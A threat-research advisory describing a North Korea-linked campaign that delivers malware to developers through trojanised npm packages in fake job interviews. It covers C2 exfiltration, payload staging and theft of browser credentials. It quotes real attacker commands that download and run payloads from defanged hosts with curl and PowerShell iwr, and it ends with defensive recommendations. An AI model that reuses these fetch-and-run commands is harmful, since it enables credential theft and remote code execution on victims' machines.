											<h3 id="h.4vet6ne0igpa">Securonix Threat Research Security Advisory</h3>
<h1 id="h.3ssfsuo1soij">Research Update: Threat Actors Behind the DEV#POPPER Campaign Have Retooled and are Continuing to Target Software Developers via Social Engineering</h1>
<h4 id="h.fqhr0liqwxu6">By Securonix Threat Research: Den Iuzvyk, Tim Peck</h4>
<p>Jul 31, 2024</p>
<h2 id="h.r3vfk35223hs">tldr:</h2>
<p>The threat actors behind the previously documented DEV#POPPER campaign are continuing to target developers by means of new malware and tactics, including support for Linux, Windows and macOS.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-29871 lazyload" data-src="https://www.securonix.com/wp-content/uploads/2024/07/ICA_DEV_2_image4.jpg" alt="" width="800" height="457" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="--smush-placeholder-width: 800px; --smush-placeholder-aspect-ratio: 800/457;" /></p>
<p>The Securonix Threat Research team has been monitoring the threat actors behind the ongoing investigation into the <a href="https://www.google.com/url?q=https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/&amp;sa=D&amp;source=editors&amp;ust=1722361905776750&amp;usg=AOvVaw1d_hpiZ0b9HR6Khn5kCHqO">DEV#POPPER campaign</a>, we have identified additional malware variants linked to the same North Korean threat actors using similar, stealthy malicious code execution tactics, though now with much more robust capabilities.</p>
<p>Based on the gathered telemetry, no specific trend in victimology was identified. However, analysis of the collected samples revealed victims are primarily scattered across South Korea, North America, Europe, and the Middle East, indicating that the impact of the attack is widespread.</p>
<p>As with the previous campaign, these new samples continue to leverage the previously documented lures targeting software developers. This form of attack is an advanced form of social engineering, designed to manipulate individuals into divulging confidential information or performing actions that they might normally not. As we mentioned in the previous DEV#POPPER advisory, the primary goal is to trick the user into unknowingly compromising themselves or current place of employment. Unlike traditional hacking methods which rely on attacker-controlled exploitation, victims of social engineering attacks are compromised by human vulnerabilities by often-times exploiting psychological manipulation. This tactic preys on basic human traits such as trust, fear or the desire to simply be helpful.</p>
<p>Today, we’ll go over the persistent and ever-evolving nature of this threat, highlighting the adversaries&#8217; dedication to their craft by compromising industry professionals. We’ll dive into the newly discovered malware tactics, techniques, and procedures (TTPs), and provide updated mitigation strategies and methods to counter these kinds of sophisticated attacks.</p>
<p>While most of the attack flow remains much the same, the threat actors have expanded their victim pool by incorporating support for not only Windows, but Linux and macOS as well. We’ll discuss this in more detail further on throughout the advisory.</p>
<h2 id="h.rq87sagbk1y1">Lure file &amp; initial code analysis</h2>
<p>The attack is carried out in the same manner as we observed in our previous report on DEV#POPPER. <p>When the interviewee extracts and executes the contents of the package using “npm install” and “npm start”, a well hidden line of JavaScript code gets executed which kicks off the infection chain.</p>
<p>The contents of the zip file contains dozens of legitimate files making identifying potential foul play difficult to spot if it’s missed by any installed antivirus. <h3 id="h.9d4k8v2xrp75">Main function</h3>
<p>The identified main function “M” orchestrates the data extraction and sending process and redirecting code execution to different operating systems (Windows, Linux, Darwin (Macos). It begins by identifying the platform, constructs paths and variables and then calls appropriate extraction functions based on the detected OS.</p>
<h3 id="h.yvmy1n6e5joo">C2 Communications</h3>
<p>The script contains several functions which prepares and sends data to a remote server by constructing a URL, preparing form data and then making an HTTP POST request to the IP and port combination we extracted earlier.</p>
<p>Another function prepares a form data object containing system information and other collected data, constructs the URL for the C2 server and then once again sends the data using the same method as the prior function. This information includes:</p>
<ul>
<li>The current time when the data is sent which helps the C2 server to log and analyze the timeline of the collected data.</li>
<li>A specific unique system identifier indicating the type of data being sent, which may help in categorizing or processing the data on the server. Some identifiers relate to system information, files, logs, or other types of collected data.</li>
<li>Another unique identifier for the infected host machine, which allows the server to track which data came from which machine.</li>
</ul>
<ul>
<li>Hostname</li>
<li>Platform (OS name)</li>
<li>Timestamp</li>
<li>The actual payload or collected data from the host machine, which could include sensitive information such as files, logs, or other captured data.</li>
</ul>
<h3 id="h.lju4rcu1wf44">Payload downloads</h3>
<p>Another function (“rt”) manages the downloading of next-stage payloads. It begins by building a URL string, using a carefully crafted curl command to download the file and performs an asynchronous task with the downloaded file. It ensures the process is repeated until the conditions are met, handling errors and retries as needed. These conditions work under the following flow:</p>
<ol start="1">
<li>Counter Check:</li>
</ol>
<ol start="1">
<li>The function ensures that an established counter has not reached or exceeded the value of timestamp + 4. If it has, the function returns early and stops executing</li>
</ol>
<ol start="2">
<li>File existence and size check:</li>
</ol>
<ol start="1">
<li>The function checks if the temporary file path (tempPath) exists</li>
<li>If the file exists, it retrieves the file&#8217;s statistics</li>
<li>It then checks if the file&#8217;s size is greater than or equal to timestamp + 4</li>
</ol>
<ol start="3">
<li>Successful Download:</li>
</ol>
<ol start="1">
<li>If the file does not exist, it attempts to download the file using the curl command</li>
<li>If the download fails, the function resets the counter and retries the task once again</li>
</ol>
<p>To sum it up, the file is downloaded using the following curl command:</p>
<p>&nbsp;</p>
<p>curl -Lo &#8220;C:\path\to\temporary\directory\p.z&#8221; &#8220;hxxp://67.203.123[.]171:1244/pdown&#8221;</p>
<p>&nbsp;</p>
<p>It is then renamed from ${tmpDir}\\p.z to ${tmpDir}\\p2.zip and then contains code to extract its contents using &#8220;tar -xzf p2.zip -C [user’s home dir]&#8221;</p>
<h2 id="h.43nggx3pk1sc">Python execution</h2>
<p>The extracted contents from the downloaded zip file in the previous section contains a single file named .npl which is saved to C:\Users\username\.npl. Despite its name, it is not a “neutral parallel language” file but rather a Python script. The entire python library is also extracted from the .zip file into the user’s home directory under C:\Users\username\.pyp\.</p>
<p>The Python script is very similar to what we saw in the previous campaign and it is at this point where the originally documented campaign and this campaign  begin to become much more closely aligned. The purpose of the .npl Python script is to simply save and execute another embedded Python script called “pay” which is saved and extracted to C:\Users\username\.n2\pay.</p>

<h2 id="h.wsb6lea72zpm">Post exploitation</h2>
<p>After the script was executed on the compromised host, we observed a few interesting actions performed by the attackers.</p>
<p>First, browser cookies were targeted. The attackers opened up a command prompt session through the Python backdoor script and changed directory to the default installation directory of Google Chrome:</p>
<p>cmd.exe /c &#8220;cd %APPDATA%\Local\Google\Chrome\User Data\default\Local Extension Settings&#8221;</p>
<p>The &#8220;Local Extension Settings&#8221; directory in Google Chrome is used to store data of any installed browser extensions. This directory holds various settings, preferences, and sometimes even log files associated with the extensions that are installed in the browser. Each extension has its own subdirectory within the folder named after the extension ID.</p>
<p>Next, the attackers downloaded a cloned version of a known browser cookie extraction script called browser_cookie3, written in Python. The library provides straightforward functions to access browser cookies without requiring deep knowledge of browser internals and supports multiple browsers while automating the process of cookie theft.</p>
<p>The attackers downloaded and executed the script through PowerShell, however they had a difficult time getting the script’s dependencies to work properly.</p>
<p>cmd.exe /c &#8220;powershell iwr -outf g.py hxxp://de.ztec[.]store:8000/www/run.py&#8221;</p>
<p>cmd.exe /c &#8220;python g.py /fc&#8221;</p>
<p>python.exe -m pip install lz4</p>
<p>python.exe -m pip install pycryptodomex</p>
<p>python.exe -m pip install py7zr</p>
<p>python.exe -m pip install requests</p>
<p>python.exe -m pip install psutil</p>

<ul>
<li>Uploads stolen files to remote FTP servers and filters these files based on extensions and/or file size</li>
<li>Automates data collection from user directories</li>
</ul>
<ul>
<li>Clipboard and keystroke logging:</li>
</ul>
<ul>
<li>Continual monitoring and exfiltration of clipboard contents and keystrokes which may assist the attackers in capturing sensitive information such as passwords or personal messages</li>
</ul>
<h3 id="h.pwae75r90duj">New Capabilities</h3>
<ul>
<li>Extended FTP functionality:</li>
</ul>
<ul>
<li>Enhanced capability to handle file uploads to remote servers, including encrypted transmission</li>
</ul>
<ul>
<li>Multi-operating system support</li>
</ul>
<ul>
<li>Both the primary Python script as well as post-exploitation scripts support macOS and Linux operating systems in addition to Windows</li>
</ul>
<ul>
<li>Enhanced obfuscation and encoding:</li>
</ul>
<ul>
<li>The scripts make use of base64 encoding for obfuscating communication with the command-and-control server making detection more difficult</li>
<li>Higher level of obfuscated Python code found throughout the script making analysis more difficult and less human readable</li>
</ul>
<ul>
<li>File system interaction:</li>
</ul>
<ul>
<li>The malware is able to traverse directories to locate specific files while excluding certain extensions and directories based on robust filtering</li>
<li>It’s capable of locating and exfiltrating files that meet specified criteria including potentially sensitive documents</li>
</ul>
<ul>
<li>Robust tooling for post-exploitation scripts:</li>
</ul>
<ul>
<li>Deploys the browser_cookie3 script to extract stored credentials and session cookies from browsers like Chrome, Brave, Opera, Yandex, and MsEdge</li>
<li>Post-exploitation scripts which steal browser-stored passwords and credit card information, significantly expanding the malware&#8217;s ability to harvest valuable data.</li>
</ul>
<h2 id="h.uaoa0uvvtni5">Securonix recommendations</h2>
<p>Social engineering attacks start with exploiting human nature versus computer systems. While difficult, it’s critical to maintain a security-focused mindset in and out of the office and especially during intense and stressful situations like job interviews.</p>
<p>The attackers behind the current and previously documented <a href="https://www.google.com/url?q=https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/&amp;sa=D&amp;source=editors&amp;ust=1722361905795578&amp;usg=AOvVaw3P1JGQlQ3wmxCpsIuEJfuv">DEV#POPPER</a> campaigns abuse this, knowing that the person on the other end of the fake interview is in a highly distracted and much more vulnerable state.  When it comes to prevention and detection, the Securonix Threat Research team recommends:</p>
<ul>
<li>If you have to execute code from potentially untrusted sources, leverage virtual machines or <a href="https://www.google.com/url?q=https://techcommunity.microsoft.com/t5/itops-talk/how-to-configure-windows-sandbox/m-p/650418&amp;sa=D&amp;source=editors&amp;ust=1722361905796064&amp;usg=AOvVaw1LXPuh0ZO2gvb0mg4K5m3B">Windows Sandbox</a>, to isolate your machine from infection.</li>
<li>Raise awareness to the fact that people are targets of social engineering attacks just as technology is exploitation. Remaining extra vigilant and security continuous, even during high-stress situations is critical to preventing the issue altogether.</li>
<li>In case of code execution, monitor common malware staging directories, especially Python script-related activity in world-writable directories. In the case of this campaign the threat actors staged in subdirectories found in the user’s %APPDATA% directory.</li>
<li>Monitor for the usage of non-default scripting languages such as Python on endpoints and servers which should normally not execute it. To assist in this, leverage additional process-level logging such as <a href="https://www.google.com/url?q=https://www.securonix.com/blog/improving-blue-team-threat-detection-with-enhanced-siem-telemetry/&amp;sa=D&amp;source=editors&amp;ust=1722361905796792&amp;usg=AOvVaw0vqcL7hS4eOWL2UxvymGVQ">Sysmon and PowerShell logging</a> for additional log detection coverage.</li>
<li>Securonix customers can scan endpoints using the Securonix hunting queries below.</li>
</ul>
